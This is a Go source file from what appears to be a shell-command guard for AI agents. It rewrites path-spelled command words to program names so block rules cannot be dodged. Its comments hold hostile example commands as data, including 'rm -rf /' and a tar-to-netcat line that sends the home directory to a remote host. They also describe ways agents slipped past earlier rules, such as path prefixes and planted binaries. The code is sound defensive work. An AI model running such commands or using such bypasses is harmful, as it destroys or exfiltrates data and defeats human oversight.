package shellparse

import (
	"path"
	"regexp"
	"strings"
)

// A command word spelled as a path runs the same program as its bare name, so
// `/usr/bin/rm -rf /` is exactly as destructive as `rm -rf /` — but every rule
// keyed on the program NAME (`^(sudo\s+)?rm\s+…`, `executable: [kubectl]`) was
// defeated by one path prefix (#3991). #3057 closed this for exec WRAPPERS
// (isExecWrapper resolves `/usr/bin/env` to `env`) and never for the command
// word itself.
//
// # Restrict-only, by construction
//
// The helpers in this file produce renderings that only RESTRICTING checks may
// consume: a BLOCK/AUDIT rule's pattern or executable condition, a hard-coded
// detection keyed on a program name. They must never satisfy an ALLOW rule,
// an exemption, a text/argument classification, a downgrade, an intent label,
// or a file-identity comparison. Each of those RELAXES a decision on a match,
// and a binary an agent writes to /tmp/x/rm and runs by path is not rm.
//
// The first version of #3991 did the opposite — it rewrote the shared
// CommandSegment.Executable, so every consumer saw the program name by
// default and relaxing ones had to opt out. Codex pass 1 on #3993 found three
// consumers that had not, each a new fail-open (argclass text classification
// excusing a protected operand, download-then-execute losing its file
// identity, a planted `rm` earning a tmp-cleanup ALLOW). Now the default is
// "as written", and a consumer that is not taught about paths is at worst the
// pre-#3991 gap, never a regression.

// homeAnchorRe matches a home-anchored path prefix: `~/` or `~user/`.
var homeAnchorRe = regexp.MustCompile(`^~[A-Za-z0-9._-]*/`)

// isAnchoredPath reports whether exe is an absolute or home-anchored path —
// the scoping isExecWrapper chose for wrappers (#3057). A relative `./rm` or
// `bin/rm` is far more likely to be a project script that shares the name
// than the system tool, so it is never reduced.
func isAnchoredPath(exe string) bool {
	return strings.HasPrefix(exe, "/") || homeAnchorRe.MatchString(exe)
}

// ProgramName returns the program an executable word runs: the basename of an
// absolute or home-anchored path, and the word itself otherwise.
//
//	"/usr/bin/rm"     ->  "rm"
//	"~/bin/tool"      ->  "tool"
//	"~root/bin/tar"   ->  "tar"
//	"rm"              ->  "rm"
//	"./rm", "bin/rm"  ->  unchanged (relative: a project script)
//	"/usr/bin/"       ->  unchanged (a directory; the shell cannot run it)
//	"/usr/bin/$x"     ->  unchanged (its runtime value is not the text)
func ProgramName(exe string) string {
	if !isAnchoredPath(exe) {
		return exe
	}
	if strings.ContainsAny(exe, "$`") || strings.HasSuffix(exe, "/") {
		return exe
	}
	base := path.Base(path.Clean(exe))
	if base == "" || base == "." || base == ".." || base == "/" || strings.HasPrefix(base, "~") {
		return exe
	}
	return base
}

// BasenameCommandWord returns text with every command word spelled as an
// absolute or home-anchored path rewritten to the program name, or "" when
// nothing was rewritten. RESTRICT-ONLY — see the file comment.
//
//	"/usr/bin/rm -rf /"                 ->  "rm -rf /"
//	"\"/usr/bin/tar\" -xf a --to-command=sh" -> "tar -xf a --to-command=sh"
//	"sudo /usr/bin/npm publish"         ->  "sudo npm publish"
//	"tar czf - ~ | /usr/bin/nc h 4444"  ->  "tar czf - ~ | nc h 4444"
//	"./rm -rf /"                        ->  ""  (relative: a project script)
//	"echo /usr/bin/rm"                  ->  ""  (an argument, not a command word)
//
// A command word is the first word of the text and the first word after an
// unquoted `|`, `||`, `&&`, `;` or `&` — pipeline stages included, because
// the statement splitters separate sequenced statements but not pipes — plus
// the word after a leading `sudo`, which most rules spell (`^(sudo\s+)?dd`).
// The word may be quoted or escaped (`"/usr/bin/tar"`, `/bin/"bash"`) as long
// as nothing inside is dynamic. Only command words are dequoted: arguments keep
// their exact text.
//
// Lexical on purpose: it runs on every restrict candidate of every statement,
// and an AST parse per candidate would multiply the pipeline's parse count.
func BasenameCommandWord(text string) string {
	var b strings.Builder
	changed := false
	i := 0
	atCommand := true
	for i < len(text) {
		c := text[i]
		if atCommand {
			// Skip whitespace to the command word.
			if c == ' ' || c == '\t' || c == '\n' {
				b.WriteByte(c)
				i++
				continue
			}
			atCommand = false
			end := wordEnd(text, i)
			word := text[i:end]
			if rw, ok := rewriteCommandWord(word); ok {
				b.WriteString(rw)
				changed = true
				word = rw
			} else {
				b.WriteString(word)
			}
			i = end
			if word == "sudo" {
				// The next word is the program sudo runs.
				atCommand = true
			}
			continue
		}
		switch c {
		case '\\':
			b.WriteByte(c)
			if i+1 < len(text) {
				b.WriteByte(text[i+1])
			}
			i += 2
			continue
		case '\'', '"':
			end := quoteEnd(text, i)
			b.WriteString(text[i:end])
			i = end
			continue
		case '|', ';', '&':
			// `|`, `||`, `|&`, `&&`, `;`, `&` all start a new command. `&>`
			// and `>&` are redirections, not separators.
			if c == '&' && i+1 < len(text) && text[i+1] == '>' {
				break
			}
			if c == '&' && i > 0 && (text[i-1] == '>' || text[i-1] == '<') {
				break
			}
			b.WriteByte(c)
			i++
			if i < len(text) && (text[i] == '|' || text[i] == '&') && (c == '|' || c == '&') {
				b.WriteByte(text[i])
				i++
			}
			atCommand = true
			continue
		}
		b.WriteByte(c)
		i++
	}
	if !changed {
		return ""
	}
	return b.String()
}

// wordEnd returns the end of the shell word starting at i: the first unquoted
// whitespace or operator character.
func wordEnd(s string, i int) int {
	for i < len(s) {
		switch s[i] {
		case ' ', '\t', '\n', '|', '&', ';', '<', '>', '(', ')':
			return i
		case '\\':
			i += 2
			continue
		case '\'', '"':
			i = quoteEnd(s, i)
			continue
		}
		i++
	}
	return len(s)
}

// quoteEnd returns the index just past the quoted span opening at s[i], or
// len(s) when it is unterminated.
func quoteEnd(s string, i int) int {
	q := s[i]
	for j := i + 1; j < len(s); j++ {
		if q == '"' && s[j] == '\\' {
			j++
			continue
		}
		if s[j] == q {
			return j + 1
		}
	}
	return len(s)
}

// rewriteCommandWord reduces one command word to its program name when it is a
// STATIC absolute or home-anchored path — the text the shell will look up,
// with nothing left for it to expand.
//
// Static-ness is decided BEFORE quote removal, by staticWordValue: an
// expansion, a substitution, a backquote, an unquoted glob or brace group makes
// the word dynamic and it is rejected — its runtime value is not the text.
// Everything else is literal pathname text, including characters that only
// look like syntax once the quotes are gone: `"/opt/my tools/tar"`,
// `/opt/my\ tools/tar`, `/opt/k=v/tar`, `"/opt/a;b/tar"`. Deciding it AFTER
// quote removal (the first version) rejected exactly those — Codex pass 3 on
// #3993 — so a directory with a space or an `=` kept main's decision.
//
// The rendering is the basename, re-quoted when it is not a plain word, so the
// rewritten command still parses as the same words. Only COMMAND words reach
// this function; arguments are never dequoted.
func rewriteCommandWord(word string) (string, bool) {
	value, quotedTilde, ok := staticWordValue(word)
	if !ok || value == "" || strings.ContainsAny(value, "\x00\n") {
		return "", false
	}
	// A quoted leading `~` is a directory NAMED "~", i.e. a relative path.
	if !strings.HasPrefix(value, "/") && (quotedTilde || !homeAnchorRe.MatchString(value)) {
		return "", false
	}
	if strings.HasSuffix(value, "/") {
		return "", false
	}
	base := path.Base(path.Clean(value))
	if base == "" || base == "." || base == ".." || base == "/" || strings.HasPrefix(base, "~") {
		return "", false
	}
	return renderWord(base), true
}

// staticWordValue performs the shell's quote removal on one word and reports
// whether the word is static — whether that value is what the shell will use.
// quotedTilde reports a `~` at the start of the word that was quoted, so it
// names a directory rather than a home.
//
// Dynamic (ok=false): `$name`, `${…}`, `$(…)`, `$((…))`, a backquote, and — in
// unquoted text — the glob characters `*`, `?`, `[` and the brace characters
// `{`, `}`. Static: single-quoted text, double-quoted text without `$` or a
// backquote, backslash escapes, ANSI-C `$'…'` spans (decoded with the shell's
// rules, as NormalizeExecName does), and any other literal character —
// spaces, `=`, `;`, `|`, `(` and the like once they are quoted or escaped.
func staticWordValue(word string) (value string, quotedTilde, ok bool) {
	var b strings.Builder
	for i := 0; i < len(word); {
		c := word[i]
		switch {
		case c == '\\':
			if i+1 >= len(word) {
				return "", false, false
			}
			b.WriteByte(word[i+1])
			i += 2
		case c == '\'':
			j := strings.IndexByte(word[i+1:], '\'')
			if j < 0 {
				return "", false, false
			}
			if i == 0 && j > 0 && word[1] == '~' {
				quotedTilde = true
			}
			b.WriteString(word[i+1 : i+1+j])
			i += j + 2
		case c == '"':
			j := i + 1
			for ; j < len(word) && word[j] != '"'; j++ {
				switch word[j] {
				case '$', '`':
					return "", false, false
				case '\\':
					if j+1 < len(word) && strings.IndexByte("$`\"\\\n", word[j+1]) >= 0 {
						j++
					}
				}
				if i == 0 && j == 1 && word[j] == '~' {
					quotedTilde = true
				}
				b.WriteByte(word[j])
			}
			if j >= len(word) {
				return "", false, false
			}
			i = j + 1
		case c == '$':
			// Every $ form is treated as dynamic, ANSI-C $'…' spans included.
			// Decoding them through NormalizeExecName dropped literal quote
			// and backslash characters from the name, so a decoded name could
			// match a DIFFERENT program's rule (a false BLOCK; Codex pass 4 on
			// #3993). Such a spelling keeps main's decision instead. It is a
			// listed residual.
			return "", false, false
		case c == '`', c == '*', c == '?', c == '[', c == '{', c == '}':
			return "", false, false
		default:
			b.WriteByte(c)
			i++
		}
	}
	value = b.String()
	// A value that starts with ~ is home-anchored only when the RAW word
	// begins with a literal, unquoted, unescaped ~. The shell expands a tilde
	// only there. Quoted, escaped (\~) or spliced-in tildes all name a
	// relative directory called "~", so anything else counts as quoted (Codex
	// pass 4 on #3993 found escaped and spliced forms treated as home).
	quotedTilde = strings.HasPrefix(value, "~") && (len(word) == 0 || word[0] != '~')
	return value, quotedTilde, true
}

// renderWord renders a program name as one shell word: as-is when it is made of
// plain characters, single-quoted otherwise.
func renderWord(name string) string {
	plain := true
	for i := 0; i < len(name); i++ {
		c := name[i]
		if !(c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || c >= '0' && c <= '9' || strings.IndexByte("._+-@%:,", c) >= 0) {
			plain = false
			break
		}
	}
	if plain {
		return name
	}
	return "'" + strings.ReplaceAll(name, "'", `'\''`) + "'"
}

// ProgramView returns a copy of parsed in which every segment's Executable is
// its Program, with SubCommand re-derived for subcommand tools, or nil when no
// segment names its program by path. RESTRICT-ONLY — see the file comment:
// callers evaluate a restricting rule against parsed OR this view, so the
// result is a union and can only add findings. Never evaluate an ALLOW rule,
// an exemption or a file-identity check against it.
func ProgramView(parsed *ParsedCommand) *ParsedCommand {
	if parsed == nil || !hasPathProgram(parsed) {
		return nil
	}
	return programViewOf(parsed)
}

func hasPathProgram(p *ParsedCommand) bool {
	for _, seg := range p.Segments {
		if seg.Program != "" && seg.Program != seg.Executable {
			return true
		}
	}
	for _, sub := range p.Subcommands {
		if sub != nil && hasPathProgram(sub) {
			return true
		}
	}
	return false
}

func programViewOf(p *ParsedCommand) *ParsedCommand {
	out := &ParsedCommand{
		Operators: p.Operators,
		Redirects: p.Redirects,
		Segments:  make([]CommandSegment, len(p.Segments)),
	}
	for i, seg := range p.Segments {
		if seg.Program != "" && seg.Program != seg.Executable {
			seg.Executable = seg.Program
			seg.IsShell = IsShellInterpreter(seg.Program)
			// Mirror parseCallExpr: a subcommand tool's first positional is
			// its subcommand. Parsed under the written name it was not split
			// off, so `/usr/bin/kubectl delete ns x` must be re-split here for
			// `executable: kubectl` + `subcommand: delete` to see it.
			if seg.SubCommand == "" && len(seg.Args) > 0 && IsSubcommandTool(seg.Program) {
				seg.SubCommand = NormalizeExecName(seg.Args[0])
				seg.Args = seg.Args[1:]
			}
		}
		out.Segments[i] = seg
	}
	for _, sub := range p.Subcommands {
		if sub != nil {
			out.Subcommands = append(out.Subcommands, programViewOf(sub))
		}
	}
	return out
}
